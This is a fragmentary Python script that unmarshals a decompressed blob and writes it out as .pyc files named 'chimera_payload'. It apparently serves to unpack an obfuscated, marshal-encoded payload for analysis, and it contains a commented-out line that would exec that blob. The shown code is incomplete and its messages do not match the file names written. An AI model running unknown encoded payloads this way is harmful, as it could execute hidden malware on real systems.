import base64, zlib, marshal, importlib.util, sys, struct, time
...
#print(totalblobdecom)

code = marshal.loads(decompressed)
pyc_filename = "chimera_payload42.pyc"

# Generate valid .pyc header
# Use current interpreter's magic number
magic = importlib.util.MAGIC_NUMBER
timestamp = struct.pack("I", int(time.time()))
padding = b'\x00\x00\x00\x00'  # for hash-based pyc, just filler
...
print(f"✅ Successfully wrote {pyc_filename}")


with open("chimera_payload4.pyc", "wb") as f:
   f.write(totalblob)

#exec(marshal.loads(totalblob))


print("✅ Wrote decompressed code object to chimera_payload.pyc")
